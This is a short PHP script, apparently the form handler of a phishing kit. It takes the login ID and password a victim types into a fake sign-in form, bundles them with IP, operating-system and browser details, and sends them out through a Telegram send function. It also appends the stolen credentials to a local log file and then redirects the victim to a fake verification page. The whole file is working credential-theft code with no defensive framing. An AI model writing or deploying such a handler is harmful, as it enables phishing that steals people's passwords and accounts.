<?php
require_once("../../config.php");

$username = $_POST['userLoginId'];
$password = $_POST['password'];

if(!empty($username) && !empty($password))
{
    $message = '//--- LOGIN ---//' . getIPAddress() . "\r\n";
    $message .= '[👤 UserLogin] = ' . $username . "\r\n";
    $message .= '[🔓 Password] = ' . $password . "\r\n";
    $message .= '[🔍 IP INFO] = ' . $date . "\r\n";
    $message .= '[💻 system] = ' . getIPAddress() . "\r\n";
    $message .= '[OS] = ' . $user_os . "\r\n";
    $message .= '[BROWSER] = ' . $user_browser . "\r\n";
    telegram_send(urlencode($message));
    $house = fopen('../../fucked/LOGIN.html', 'a');
    fwrite($house, $message);
    fclose($house);
    header("Location: ../loading.php?id=verification");
}
?>